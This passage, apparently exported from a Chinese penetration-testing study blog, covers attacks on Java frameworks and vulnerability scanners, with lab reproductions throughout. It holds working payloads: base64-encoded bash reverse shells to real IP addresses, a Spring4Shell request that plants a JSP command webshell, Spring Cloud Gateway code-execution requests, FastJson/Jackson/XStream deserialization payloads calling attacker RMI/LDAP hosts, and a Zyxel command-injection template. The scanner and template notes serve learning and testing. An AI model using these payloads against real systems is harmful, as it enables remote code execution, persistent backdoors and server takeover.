&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzU1NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)123\n\n\n\n\n\n\nSpring Framework远程代码执行漏洞 CVE-2022-22965Spring Framework是一个开源应用框架，初衷是为了降低应用程序开发的复杂度，具有分层体系结构，允许用户选择组件，同时还为J2EE应用程序开发提供了一个好用的框架。\n影响版本：\nSpring Framework &lt; 5.3.18\nSpring Framework &lt; 5.2.20\nSpring Framework 的衍生框架构建的网站或应用\n复现参考：https://www.csdn.net/article/2022-11-24/128026635\n1、手工复现\nGET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1\n\n\n\n2、访问jsp触发后门http://localhost:8080/tomcatwar.jsp?pwd=j&amp;cmd=id\n3、工具项目https://github.com/BobTheShoplifter/Spring4Shell-PoC\n\n\nSpring boot命令执行 (CVE-2022-22947)影响版本：\nSpring Cloud Gateway是Spring中的一个API网关。\nSpring Cloud Gateway 3.1.x &lt; 3.1.1\nSpring Cloud Gateway 3.0.x &lt; 3.0.7\n其他旧的、不受支持的Spring Cloud Gateway 版本\n手工复现参考：https://cloud.tencent.com/developer/article/2164533\nPOST /actuator/gateway/routes/test HTTP/1.1Host: www.luckysec.cn:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonContent-Length: 329&#123;  &quot;id&quot;: &quot;hacktest&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\\&quot;id\\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;\n\n\n \nPOST /actuator/gateway/refresh HTTP/1.1Host: www.luckysec.cn:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0\n\n\nDELETE /actuator/gateway/routes/test HTTP/1.1Host: www.luckysec.cn:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeContent-Length: 0\n\n\n-综合 CVE 利用工具:直接梭哈\nhttps://github.com/0x727/SpringBootExploit\nhttps://github.com/13exp/SpringBoot-Scan-GUI\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"083-服务攻防-J2EE组件&fastjson&jackson&xstream等项目","url":"/2025/09/16/083-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-J2EE%E7%BB%84%E4%BB%B6&fastjson&jackson&xstream%E7%AD%89%E9%A1%B9%E7%9B%AE/","content":"083-服务攻防-J2EE组件&amp;fastjson&amp;jackson&amp;xstream等项目知识点1、J2EE-组件Jackson-本地demo&amp;CVE（数据处理）\n2、J2EE-组件FastJson-本地demo&amp;CVE（数据处理）\n3、J2EE-组件XStream-本地demo&amp;CVE（数据处理）\n章节点：\n1、目标判断-端口扫描&amp;组合判断&amp;信息来源\n2、安全问题-配置不当&amp;CVE漏洞&amp;弱口令爆破\n3、复现对象-数据库&amp;中间件&amp;开发框架&amp;应用协议\n\n黑盒检测：Java应用 请求参数数据以json&#x2F;xml格式发送测试\n黑盒判断：通过提交数据报错信息得到什么组件\nxml格式(xstream) 或 json 格式（fastjson jackson）\n白盒审计：直接看引用组件版本\n一、演示案例-J2EE-组件Jackson-本地demo&amp;CVE当下流行的json解释器，主要负责处理Json的序列化和反序列化。\n代码执行 (CVE-2020-8840)1、使用到的jackson2、使用jackson去解析json数据3、json数据可控的(攻击去替换json数据 payload进行jndi注入)\nString json = &quot;[\\&quot;org.apache.xbean.propertyeditor.JndiConverter\\&quot;, &#123;\\&quot;asText\\&quot;:\\&quot;ldap://localhost:1389/Exploit\\&quot;&#125;]&quot;;\n\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 1.92.144.175\n\n\n\n\n\n\n\n在黑盒情况下：抓包网站的包发现一些数据是json格式发送的这个时候将json替换为pyload发送，发过去有接受返回就代表有漏洞\n代码执行 (CVE-2020-35728）影响版本\nFasterXML jackson-databind 2.x &lt; 2.9.10.8\npayload：\nString payload = &quot;[\\&quot;com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\\&quot;,&#123;\\&quot;jndiPath\\&quot;:\\&quot;rmi://47.94.236.117:1099/gtaafz\\&quot;&#125;]&quot;;\n\n\n\n\n\n二、演示案例-J2EE-组件FastJson-本地demo&amp;CVE阿里巴巴公司开源的json解析器，它可以解析JSON格式的字符串，支持将JavaBean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。\n重点就是：不同版本的fastjson，不同的poc\n利用POC项目：GitHub - kezibei&#x2F;fastjson_payload（该项目是针对不同环境的）\nFastJson &lt;&#x3D; 1.2.24String payload = &quot;&#123;\\r\\n&quot;      \t\t+ &quot;    \\&quot;a\\&quot;: &#123;\\r\\n&quot;      \t\t+ &quot;        \\&quot;@type\\&quot;: \\&quot;java.lang.Class\\&quot;, \\r\\n&quot;      \t\t+ &quot;        \\&quot;val\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;\\r\\n&quot;      \t\t+ &quot;    &#125;, \\r\\n&quot;      \t\t+ &quot;    \\&quot;b\\&quot;: &#123;\\r\\n&quot;      \t\t+ &quot;        \\&quot;@type\\&quot;: \\&quot;com.sun.rowset.JdbcRowSetImpl\\&quot;, \\r\\n&quot;      \t\t+ &quot;        \\&quot;dataSourceName\\&quot;: \\&quot;rmi://47.94.236.117:1099/ccbht1\\&quot;, \\r\\n&quot;      \t\t+ &quot;        \\&quot;autoCommit\\&quot;: true\\r\\n&quot;      \t\t+ &quot;    &#125;\\r\\n&quot;      \t\t+ &quot;&#125;&quot;;\n\n\n\n\n\nFastJson &lt;&#x3D; 1.2.47&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;\n\n\n\n\nFastJson &lt;&#x3D; 1.2.80 (利用条件比较苛刻)利用poc只能用源码项目中调用的第三方库或者组件(类)等\nString poc1 = &quot;&#123;\\n&quot; +              &quot;    \\&quot;@type\\&quot;:\\&quot;java.lang.Exception\\&quot;,\\n&quot; +              &quot;    \\&quot;@type\\&quot;:\\&quot;org.codehaus.groovy.control.CompilationFailedException\\&quot;,\\n&quot; +              &quot;    \\&quot;unit\\&quot;:&#123;&#125;\\n&quot; +              &quot;&#125;&quot;;      String poc2 = &quot;&#123;\\n&quot; +              &quot;    \\&quot;@type\\&quot;:\\&quot;org.codehaus.groovy.control.ProcessingUnit\\&quot;,\\n&quot; +              &quot;    \\&quot;@type\\&quot;:\\&quot;org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\&quot;,\\n&quot; +              &quot;    \\&quot;config\\&quot;:&#123;\\n&quot; +              &quot;        \\&quot;@type\\&quot;:\\&quot;org.codehaus.groovy.control.CompilerConfiguration\\&quot;,\\n&quot; +              &quot;        \\&quot;classpathList\\&quot;:\\&quot;http://192.168.1.4:82/attack-1.jar\\&quot;\\n&quot; +              &quot;    &#125;\\n&quot; +              &quot;&#125;&quot;;\n\n\n在实战中，获取目标项目源码后看下调用的第三方库或者组件有哪些，然后在利用poc项目去找对应的POC去测试看看(机会不大)\n\n\n\n\n三、演示案例-J2EE-组件XStream-靶场&amp;CVE开源Java类库，能将对象序列化成XML或XML反序列化为对象\n代码执行 (CVE-2021-21351)影响版本：\nXstream&lt;&#x3D;1.4.15\n1、生成反弹Shell的JNDI注入java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjE0NC4xNzUvOTkwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A 1.92.144.175\n\n\n\n\n2、构造JNDI注入Payload以POST方式提交&lt;sorted-set&gt;   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;     &lt;type&gt;ysomap&lt;/type&gt;     &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;       &lt;m__DTMXRTreeFrag&gt;         &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;           &lt;m__size&gt;-10086&lt;/m__size&gt;           &lt;m__mgrDefault&gt;             &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;             &lt;m__incremental&gt;false&lt;/m__incremental&gt;             &lt;m__source__location&gt;false&lt;/m__source__location&gt;             &lt;m__dtms&gt;               &lt;null/&gt;             &lt;/m__dtms&gt;             &lt;m__defaultHandler/&gt;           &lt;/m__mgrDefault&gt;           &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;           &lt;m__indexing&gt;false&lt;/m__indexing&gt;           &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;             &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;               &lt;javax.sql.rowset.BaseRowSet&gt;                 &lt;default&gt;                   &lt;concurrency&gt;1008&lt;/concurrency&gt;                   &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;                   &lt;fetchDir&gt;1000&lt;/fetchDir&gt;                   &lt;fetchSize&gt;0&lt;/fetchSize&gt;                   &lt;isolation&gt;2&lt;/isolation&gt;                   &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;                   &lt;maxRows&gt;0&lt;/maxRows&gt;                   &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;                   &lt;readOnly&gt;true&lt;/readOnly&gt;                   &lt;rowSetType&gt;1004&lt;/rowSetType&gt;                   &lt;showDeleted&gt;false&lt;/showDeleted&gt;                   &lt;dataSource&gt;rmi://evil-ip:1099/example&lt;/dataSource&gt;                   &lt;listeners/&gt;                   &lt;params/&gt;                 &lt;/default&gt;               &lt;/javax.sql.rowset.BaseRowSet&gt;               &lt;com.sun.rowset.JdbcRowSetImpl&gt;                 &lt;default/&gt;               &lt;/com.sun.rowset.JdbcRowSetImpl&gt;             &lt;/fPullParserConfig&gt;             &lt;fConfigSetInput&gt;               &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;               &lt;name&gt;setAutoCommit&lt;/name&gt;               &lt;parameter-types&gt;                 &lt;class&gt;boolean&lt;/class&gt;               &lt;/parameter-types&gt;             &lt;/fConfigSetInput&gt;             &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;             &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;           &lt;/m__incrementalSAXSource&gt;           &lt;m__walker&gt;             &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;           &lt;/m__walker&gt;             &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;           &lt;m__idAttributes/&gt;           &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;           &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;           &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;         &lt;/m__dtm&gt;         &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;       &lt;/m__DTMXRTreeFrag&gt;       &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;       &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;     &lt;/value&gt;   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;   &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;     &lt;type&gt;ysomap&lt;/type&gt;     &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;       &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;     &lt;/value&gt;   &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt; &lt;/sorted-set&gt;\n\n\n\n\n\n\n代码执行 （CVE-2021-29505）影响版本\nXStream &lt;&#x3D; 1.4.16\n1、生成反弹Shell的反序列化JNDI注入java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjkyLjE0NC4xNzUvOTkwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;\n\n\n2、构造反序列化JNDI注入Payload以POST方式提交&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;    &lt;unserializable-parents/&gt;    &lt;java.util.PriorityQueue&gt;        &lt;default&gt;            &lt;size&gt;2&lt;/size&gt;        &lt;/default&gt;        &lt;int&gt;3&lt;/int&gt;        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;            &lt;type&gt;12345&lt;/type&gt;            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;            &lt;/value&gt;        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;            &lt;type&gt;12345&lt;/type&gt;            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;                    &lt;bodyParts/&gt;                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;                                    &lt;names&gt;                                        &lt;string&gt;aa&lt;/string&gt;                                        &lt;string&gt;aa&lt;/string&gt;                                    &lt;/names&gt;                                    &lt;ctx&gt;                                        &lt;environment/&gt;                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;                                            &lt;java.rmi.server.RemoteObject&gt;                                                &lt;string&gt;UnicastRef&lt;/string&gt;                                                &lt;string&gt;evil-ip&lt;/string&gt;                                                &lt;int&gt;1099&lt;/int&gt;                                                &lt;long&gt;0&lt;/long&gt;                                                &lt;int&gt;0&lt;/int&gt;                                                &lt;long&gt;0&lt;/long&gt;                                                &lt;short&gt;0&lt;/short&gt;                                                &lt;boolean&gt;false&lt;/boolean&gt;                                            &lt;/java.rmi.server.RemoteObject&gt;                                        &lt;/registry&gt;                                        &lt;host&gt;evil-ip&lt;/host&gt;                                        &lt;port&gt;1099&lt;/port&gt;                                    &lt;/ctx&gt;                                &lt;/candidates&gt;                            &lt;/aliases&gt;                        &lt;/nullIter&gt;                    &lt;/sm&gt;                &lt;/message&gt;            &lt;/value&gt;        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;    &lt;/java.util.PriorityQueue&gt;&lt;/java.util.PriorityQueue&gt;\n\n\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"101-漏洞发现-联动&特征类&综合类&工具项目下载等","url":"/2025/09/16/101-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E8%81%94%E5%8A%A8&%E7%89%B9%E5%BE%81%E7%B1%BB&%E7%BB%BC%E5%90%88%E7%B1%BB&%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E4%B8%8B%E8%BD%BD%E7%AD%89/","content":"101-漏洞发现-联动&amp;特征类&amp;综合类&amp;工具项目下载等知识点：\n1、综合类-Burp&amp;Xray&amp;Awvs&amp;Goby\n2、特征类-Afrog&amp;Yakit&amp;Nuclei\n3、联动类-主动扫描&amp;被动扫描&amp;中转扫描\n对比工具优缺点\n\n爬虫：常规漏洞测试\nPoc：用网上各种组件框架的漏洞去测试\nAwvs：爬虫强，Poc国内差点\n任务添加&amp;数据头部&amp;代理模式&amp;扫描模式等\nXray：爬虫弱，Poc国内友好\n\n工具联动意义\n\n相互联动性解决漏扫(APP、小程序等)\n相互联动性解决URL未探针\n\n特征类-三方Poc调用&amp;模版Poc调用案例1：单点对某特征点进行安全评估docker拉取靶场镜像：docker run -it -p 8888:8080 vulhub/struts2:s2-053docker run -it -p 8090:8090 vulhub/fastjson:1.2.45docker run -it -p 8888:8080 vulhub/shiro:1.2.4\n\nGoby-综合类https://gobysec.net/\n\nGoby是一款新的网络安全测试工具，由赵武Zwell（Pangolin、JSky、FOFA作者）打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员更快的拿下目标。\n\n\n\n\n\n\nNuclei-较综合类官网地址：https://nuclei.projectdiscovery.io/\n项目下载：https://github.com/projectdiscovery/nuclei\n官方Nuclei-Templates&amp;第三方Nuclei-Templates：\nhttps://github.com/projectdiscovery/nuclei-templates\nhttps://github.com/ExpLangcn/NucleiTP\n扫描批量url\nnucle -l urls.txt\n\n扫描单个目标\nnuclei -target xxx.com\n\n\n加载对应的poc脚本，可以是当前路径下\nnuclei -t ./test/nuclei -t ./test/test.yaml\n\n推荐使用，批量检测urls.txt，poc为test.yaml，输出结果result.txt\nnuclei -l urls.txt -t test.yaml -o result.txt\n\nAfrog-特征类https://github.com/zan8in/afrog\nAfrog是一款性能卓越、快速稳定、PoC可定制的漏洞扫描（挖洞）工具，PoC涉及CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意文件读取、命令执行等多种漏洞类型，帮助网络安全从业者快速验证并及时修复漏洞。扫描单个目标\nafrog -t http://example.com -o result.html\n\n\n扫描多个目标\nafrog -T urls.txt -o result.html\n\n测试单个PoC\nafrog -t http://example.com -P ./testing/poc-test.yaml -o result.html\n\n\n测试多个PoC\nafrog -t http://example.com -P ./testing/ -o result.html\n\nYakit-可特征可综合https://www.yaklang.com/\n综合类-主动漏扫&amp;中转联动&amp;被动联动案例1：单点工具主动对某站点进行安全评估http://testphp.vulnweb.com/\nAWVSAcunetix一款商业的Web漏洞扫描程序，它可以检查Web应用程序中的漏洞，如SQL注入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个操作方便的图形用户界面，并且能够创建专业级的Web站点安全审核报告。新版本集成了漏洞管理功能来扩展企业全面管理、优先级和控制漏洞威胁的能力\n\nXrayXray是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持Windows &#x2F;macOS &#x2F;Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。\n.\\xray_windows_amd64.exe webscan --basic-crawler http://xx/ --html-output xx.html\n\n\n\n案例2：联动对APP抓包进行安全评估eg：安卓模拟器某APP应用\n\n \n\nXray设置被动扫描\n.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:9999 --html-output xx.html\n\n\nBurp&amp;Xray联动-抓包给xray扫1、主-Burp设置转发代理\n\n\n\n2、副-Xray设置被动扫描\n一旦打开软件，流量包就会转发到xray上面进行漏洞扫描\n.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output xx.html\n\n\nAwvs&amp;Xray联动-爬虫给xray扫1、主-Awvs设置代理扫描\n\n2、副-Xray设置被动扫描\n.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:7788 --html-output xx.html\n\n\nAwvs&amp;Burp&amp;Xray中转联动-都扫看流量1、主-Awvs设置代理扫描\n\n2、中-Burp设置转发代理\n\n\n3、副-Xray设置被动扫描\n.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:9999 --html-output xx.html\n\n\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"084-服务攻防-集合PDF&环境项目&其他等","url":"/2025/09/16/084-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E9%9B%86%E5%90%88PDF&%E7%8E%AF%E5%A2%83%E9%A1%B9%E7%9B%AE&%E5%85%B6%E4%BB%96%E7%AD%89/","content":"084-服务攻防-集合PDF&amp;环境项目&amp;其他等演示案例:端口协议-口令爆破&amp;未授权\n桌面应用-QQ&amp;WPS&amp;Clash\n参考:https://mp.weixin.qq.com/s/xp_LOUmGImrRmkPrDqxKjw\n弱口令爆破https://github.com/vanhauser-thc/thc-hydrahydra 是一个自动化的爆破工具，暴力破解弱密码,是一个支持众多协议的爆破工具，已经集成到KaliLinux中，直接在终端打开即可\n","categories":["小迪学习笔记"],"tags":["渗透测试","Web安全","网络安全"]},{"title":"102-漏洞发现-Yaml(Poc)语法&模版生成插件&资源等","url":"/2025/09/16/102-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-Yaml(Poc)%E8%AF%AD%E6%B3%95&%E6%A8%A1%E7%89%88%E7%94%9F%E6%88%90%E6%8F%92%E4%BB%B6&%E8%B5%84%E6%BA%90%E7%AD%89/","content":"102-漏洞发现-Yaml(Poc)语法&amp;模版生成插件&amp;资源等知识点：\n1、Nuclei-Poc开发-环境配置&amp;编写流程\n2、Nuclei-Poc开发-Yaml语法&amp;匹配提取\n3、Nuclei-Poc开发-BurpSuite一键生成插件\nNuclei-Poc开发-环境配置&amp;编写流程1、开发环境：Vscode+Yaml插件\nVisual Studio Code - Code Editing. Redefined\n\n2、开发文档参考资料\n官方文档\nBasic HTTP Protocol - ProjectDiscovery Documentation\n\nNuclei-Poc开发-Yaml语法&amp;匹配提取YAML是一种数据序列化语言，它的基本语法规则注意如下：\n\n大小写敏感\n使用缩进表示层级关系\n缩进时不允许使用Tab键，只允许使用空格。\n缩进的空格数目不重要，只要相同层级的元素左侧对齐即可\n\nYaml Poc模版：\n编号 id(描述)\n\n信息 info(描述)\n\n\n\n\n关于模板的下一个重要信息是信息块。信息块提供 名称 、 作者 、 严重性 、 描述 、参考和 标签 。它还包含表示模板严重性的严重性字段，信息块还支持动态字段，因此可以定义N个key: value块以提供有关模板的更多有用信息。reference是另一个流行的标签，用于定义模板的外部参考链接。\n另一个总是添加到info块中的有用标签是 tags 。这允许您将一些自定义标签设置为模板，具体取决于目的等cve。rce这允许核心使用您的输入标签识别模板并仅运行它们。\n\n\n\n\n请求 http file tcp等(漏洞以什么方式请求)\n\n\n\n\nNuclei 为与 HTTP 协议相关的各种功能提供了广泛的支持。支持基于原始和模型的 HTTP 请求，以及非 RFC 客户端请求选项也支持。还可以指定有效负载，并且可以根据有效负载值以及本页面稍后显示的更多功能来转换原始请求\n根据poc需要，来决定请求方法GET 、 POST 、 PUT 、DELETE等。\n\n\n\n\nVariable\nValue\n\n\n\n\n   | {{BaseURL}}  | [https://example.com:443/foo/bar.php](https://example.com/foo/bar.php) |\n   | {{RootURL}}  | [https://example.com:443](https://example.com/)              |\n   | {{Hostname}} | example.com:443                                              |\n   | {{Host}}     | example.com                                                  |\n   | {{Port}}     | 443                                                          |\n   | {{Path}}     | /foo                                                         |\n   | {{File}}     | bar.php                                                      |\n   | {{Scheme}}   | https                                                        |\n\n\n\n\n匹配 matchers Interactsh(对结果匹配关键字来判断是否存在漏洞)\n匹配器匹配器允许对协议响应进行不同类型的灵活比较。非常易于编写，并且可以根据需要添加多个检查以实现非常有效的扫描。\n类型可以在请求中指定多个匹配器。基本上有6种类型的匹配器：\n\n\n\nMatcher Type\nPart Matched\n\n\n\nstatus\nInteger Comparisons of Part\n\n\nsize\nContent Length of Part\n\n\nword\nPart for a protocol\n\n\nregex\nPart for a protocol\n\n\nbinary\nPart for a protocol\n\n\ndsl\nPart for a protocol\n\n\n条件可以在单个匹配器中指定多个单词和正则表达式，并且可以使用AND和OR等不同条件进行配置。\n\nAND - 使用 AND 条件允许匹配匹配器的单词列表中的所有单词。只有这样，当所有单词都匹配时，请求才会被标记为成功。\nOR - 使用 OR 条件允许匹配匹配器列表中的单个单词。当匹配器匹配到一个单词时，请求将被标记为成功。\n\n\n提取 extractors(对结果提取页面长度、状态等来判断是否存在漏洞)\n\n\n\n\n\n\n\n\n开发流程：0、poc模版套用修改\n\n\n\n1、poc创建独立编号\n\n\n\n2、poc填入详细信息\n\n\n\n3、poc提交协议流程编写\n\n\n\n4、poc结果匹配模式判断\n\n\n\n5、poc结果提取模式判断\n\n\n\n案例1：CVE-2023-28432 （匹配结果）https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n\n\n\n\n\nid: CVE-2023-28432 info:  name: MinIO集群模式信息泄露漏洞（CVE-2023-28432）  author: xiaodisec  severity: low  description: 在其RELEASE.2023-03-20T20-16-18Z版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD。  reference:    - https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md  tags: MinIO,CVE  http:  - raw:      - |        POST /minio/bootstrap/v1/verify HTTP/1.1&#123;% raw %&#125;        Host: &#123;&#123;Hostname&#125;&#125;        Content-Type: application/x-www-form-urlencoded    matchers:      - type: word        part: body        words:          - &#x27;&quot;MINIO_ROOT_PASSWORD&quot;:&#x27;          - &#x27;&quot;MINIO_ROOT_USER&quot;:&#x27;          - &#x27;&quot;MinioEnv&quot;:&#x27;        condition: and\n\n\n\n案例2：CVE-2022-30525（匹配交互）（CVE-2022-30525）Zyxel 防火墙未经身份验证的远程命令注入_zyxel.selfrep-CSDN博客\n\n\n\nid: CVE-2022-30525 info:  name: Zyxel 防火墙远程命令注入漏洞  author: xiaodisec  severity: high  description: 该漏洞影响支持零接触配置 (ZTP) 的 Zyxel 防火墙，其中包括 ATP 系列、VPN 系列和 USG FLEX 系列（包括 USG20-VPN 和 USG20W-VPN）。该漏洞标识为 CVE-2022-30525，允许未经身份验证的远程攻击者以nobody受影响设备上的用户身份执行任意代码。  reference:    - https://blog.csdn.net/weixin_43080961/article/details/124776553  tags: zyxel,cve,rce  http:  - raw:      - |        POST /ztp/cgi-bin/handler HTTP/1.1&#123;% raw %&#125;        Host: &#123;&#123;Hostname&#125;&#125;        Content-Type: application/json        &#123;&quot;command&quot;:&quot;setWanPortSt&quot;,&quot;proto&quot;:&quot;dhcp&quot;,&quot;port&quot;:&quot;4&quot;,&quot;vlan_tagged&quot;:&quot;1&quot;,&quot;vlanid&quot;:&quot;5&quot;,&quot;mtu&quot;:&quot;&#123;&#123;exploit&#125;&#125;&quot;,&quot;data&quot;:&quot;hi&quot;&#125;    payloads:      exploit:        - &quot;;ping -c 3 &#123;&#123;interactsh-url&#125;&#125;;&quot;    